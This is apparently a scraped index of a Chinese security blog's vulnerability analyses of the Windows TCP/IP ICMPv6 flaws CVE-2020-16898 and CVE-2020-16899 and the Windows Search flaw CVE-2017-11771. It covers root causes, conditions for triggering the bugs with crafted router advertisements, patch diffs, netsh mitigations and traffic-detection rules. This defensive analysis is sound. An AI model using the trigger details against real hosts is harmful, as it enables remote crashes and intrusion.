NdisGetDataBuffer()函数的第1个参数为传入的_NET_BUFFER结构。NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。函数执行完成后，返回结果如下： 返回的恰好为DNSSL Option的地址。 然后调用NetioAdvanceNetBuffer()函数。执行NetioAdvanceNetBuffer()函数之前，_NET_BUFFER的结构如下所示： 在执行完NetioAdvanceNetBuffer()函数后，结构变为： 此处该函数主要作用是前进8个字节进行数据读取，其整体流程及部分关键参数值如下： 继续向下，通过Length字段计算BytesToRead的长度，并对Lifetime的值进行是否为0xffffffff的检查： 后续会进行一些上下文初始化、事件记录等操作，然后进入循环，开始处理Opt","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:3","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker可以直接发起远程攻击 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:4","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 使用大量的0进行填充以触发漏洞。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:5","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"6. 补丁分析 1. 补丁对比结果 针对Ipv6pUpdateDNSSL()函数的补丁对比结果如下： 2. 补丁思路 根据补丁对比结果，微软新增了对BytesToRead值的校验，在读取完Suffixes之后，为确保不发生越界读，新增了一次对BytesToRead的校验，确保小于0x100。而在漏洞分析中，触发漏洞时该值是大于0x100的。 3. 补丁验证 使用安装更新补丁后的Ipv6UpdateDNSSL()函数进行验证，新增保证BytesToRead的值最大为0x100的代码： ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:6","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:4:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"五、漏洞检测和防御 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞检测 针对该漏洞，目前暂未发现漏洞原理侧的无损检测。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:1","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 防御思路 流量防御：需要监控IPv6的流量传输，对于Type为134的路由广播数据包进行检测，确认其Type为0x1f的DNSSL的Padding部分是否有大于等于256个0字符。 终端防御：根据补丁对比结果，可以按照微软的补丁思路使用热补丁进行防御，对BytesToRead的值再加一次校验。 2. 可能存在的风险 暂时未知。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:2","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"六、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 https://tools.ietf.org/html/rfc8106 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:6:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2020-16898 “Bad Neighbor \" Windows TCP/IP远程代码执行漏洞分析 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:0:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Remote Code Execution Vulnerability 漏洞编号：CVE-2020-16898 漏洞类型：Design Weakness 漏洞影响：Code Execution CVSS评分：9.8 利用难度：Medium 基础权限：不需要 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:1","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:2","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为25(0x19，递归DNS服务器选项)且长度字段值为偶数的ICMPv6的路由广播数据包时，处理逻辑存在纰漏，导致存在远程代码执行漏洞。成功利用该漏洞的攻击者可以在目标机器（主机或服务器）上执行任意代码。 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:3","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:4","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:5","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：无需任何操作，可正常与攻击机通信即可 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:1","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:2","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateRDNSS()函数 漏洞对象：ICMPv6路由广播中的option结构 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:1","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。 访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：Pv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:2","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了RDNSS option，其中包含RDNSSes的地址。该信息使用现有ND message(例如RA)作为载体。IPv6主机可以通过RA消息配置一个或多个RDNSS的IPv6地址。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是RDNSS option，另外一种则与 CVE-2020-16899相关。 2. RDNSS Option Structure RDNSS option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，RDNSS option type identifier，0x19 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。 0x02 2 Reserved 保留字段 0x04 4 Lifetime RDNSS地址可用于名称解析的最长时间（以秒为单位）（相对于接收包的时间）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用RDNSS地址。 0x08 16 Address of IPv6 Recursive DNS Servers 一个或多个128位IPv6地址。 地址的数量由Length字段确定：Number of addresses = (Length - 1) / 2。 对于Length字段，如果该选项中仅包含一个IPv6地址，则最小值为3。 每增加一个RDNSS地址，长度就会增加2。接收的主机使用该字段来确定选项中IPv6地址的数量。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值3，以及是否满足(Length - 1) % 2 == 0； 对于RDNSS option，还会检查Address字段是否为一个单播地址； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： 并没有发现明显的较为有价值的Call Stack信息，但是发现最终的crash原因的是GS机制的Security Cookie校验失败，也就是说该值被覆盖掉了。那么很有可能是一个溢出。除此之外，只发现了tcpip!Ipv6pHandleRouterAdvertisement+0x1269函数，再往后就直接报gsfailure了。 2. 静态分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 1. 函数调用链 根据crash现场信息，获取到关键函数tcpip!Ipv6pHandleRouterAdvertisement()，首先确认该函数到漏洞函数的前后调用链。 首先查看其交叉引用关系： 其上层调用函数为Icmpv6ReceiveDatagrams()，跟进，并查看交叉引用关系： 没有再发现显式的函数调用。转而向tcpip!Ipv6pHandleRouterAdvertisement()的下层搜索： 发现漏洞函数调用。至此，函数调用链可以简单概括为： Icmpv6ReceiveDatagrams() -\u003e tcpip!Ipv6pHandleRouterAdvertisement() -\u003e Ipv6pUpdateRDNSS() 2. 漏洞函数分析 经过简单分析可以明确，调用链的顶层函数Icmpv6ReceiveDatagrams()没有发现实质性的与该漏洞相关的处理代码，而在tcpip!Ipv6pHandleRouterAdvertisement() 函数中发现了对漏洞函数Ipv6pUpdateRDNSS()的调用。根据crash分析，最后报了gsfailure，而且关键函数为tcpip!Ipv6pHandleRouterAdvertisement()，在该函数的起始位置确实发现了GS校验： 那么很有可能是在漏洞函数Ipv6pUpdateRDNSS()中发生了溢出，导致了其调用函数tcpip!Ipv6pHandleRouterAdvertisement()的GS校验失败。 进入漏洞函数Ipv6pUpdateRDNSS()： NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller. The buffer must be greater than or equal in size to the number of bytes specified in BytesNeeded . If this value is non-NULL, and the data requested is not contiguous, NDIS copies the requested data to the area indicated by Storage . UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。NET_BUFFER的结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 首先获取到RDNSS option结构，然后读取Length字段来计算Address字段有几个Address值。 确认有多少Address之后，进入循环，对每个Address进行处理。这里还有一个判断，如果不是单播地址，直接忽略： 在上面的处理过程中，存在一个问题：假设Length的长度为4，那么计算结束之后，AddressCount的值应该为1。此时，按照正常逻辑，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24，从而导致了缓冲区的溢出。 根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。当提供一个偶数Length值时，Windows TCP/IP堆栈错误地将buffer前进了8个字节。这主要是因为堆栈在内部以16字节为增量进行计数，并且没有使用非RFC兼容长度值的处理代码。这种不匹配导致堆栈将当前选项的最后8个字节解释为第二个选项的开始，最终导致","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:3","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker需要搭配其他内存泄漏或信息泄漏漏洞来实现RCE attacker需要想办法绕过tcpip.sys的GS保护机制 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:4","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 在流量中可以明显看出，第一个Option结构的Address字段错误识别计算了一个Recursive DNS Server的值： 第1个Recursive DNS Server的地址为0018-0027，后续的8个字节不应该再进行识别。选中第2个Recursive DNS Server时情况如下： 第2个Recursive DNS Server的地址为0028-0037。但是该16个字节中的后8个字节很明显为下一个ICMPv6 Option结构的内容： ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:5","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:4:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"五、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:5:0","tags":["漏洞"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:0:0","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:0","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search 堆溢出漏洞 漏洞编号：CVE-2017-11771；Bugtraq ID：101114 漏洞类型：Remote Code Execution ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:1","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:2","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"3. 漏洞利用 Windows Search服务在处理内存中的对象时存在缺陷，会造成堆溢出。远程未经过认证的攻击者可以通过向目标主机发起一个恶意请求实现任意代码执行，成功的攻击可以获得目标主机的SYSTEM权限。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:3","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 7 • Microsoft Windows 8 • Microsoft Windows 8.1 • Microsoft Windows 10 • Microsoft Windows Server 2003 • Microsoft Windows Server 2008 • Microsoft Windows Server 2012 • Microsoft Windows Server 2016 • Microsoft Windows Vista • Microsoft Windows XP ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:4","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"5. 解决方案 获取微软官方针对此漏洞的安全补丁，地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11771 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:5","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"二、漏洞复现 暂无 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:0","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. 环境搭建 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:1","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. 复现过程 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:2","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:0","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CFixedVarBufferAllocator::CFixedVarBufferAllocator() 漏洞参数：cbReadBuffer and cbReserved 漏洞对象：堆分配的buffer ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:1","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 与本漏洞相关的是CPMGetRowsIn消息。该消息主要用于从查询中请求数据行(row)，其详细格式如下： Offset Size (bytes) Field ------------------------------------------ 0x00 0x4 hCursor 0x04 0x4 cRowsToTransfer 0x08 0x4 cbRowWidth 0x0c 0x4 cbSeek 0x10 0x4 cbReserved 0x14 0x4 cbReadBuffer 0x18 0x4 ulClientBase 0x1c 0x4 fBwdFetch 0x20 0x4 eType 0x24 0x4 chapt 0x28 variable SeekDescription cRowsToTransfer字段指定CPMGetRowsOut消息中包括多少row，cbRowWidth字段表示row的长度（以字节为单位），cbReserved字段指定结果在CPMGetRowsOut消息中的偏移量(与cbSeek字段相加然后进行计算偏移)，cbReadBuffer字段指定 CPMGetRowsOut消息中的数据大小，以字节为单位，该字段必须设置为_cbRowWidth值的最大值或_cRowsToTransfer值的1000倍，四舍五入到最接近的512字节倍数。 该值不得超过0x00004000。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:2","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"3. 详细分析 server接收到CPMGetRowsIn消息后，首先检查cbReserved的值是否小于cbReadBuffer。然后调用CFixedVarBufferAllocator::CFixedVarBufferAllocator()来初始化buffer，该buffer中应该有相应的CPMGetRowsOut消息。该函数会使用下面的方式对结果数据进行初始位置和结束位置的计算： resultDataStart = buffer 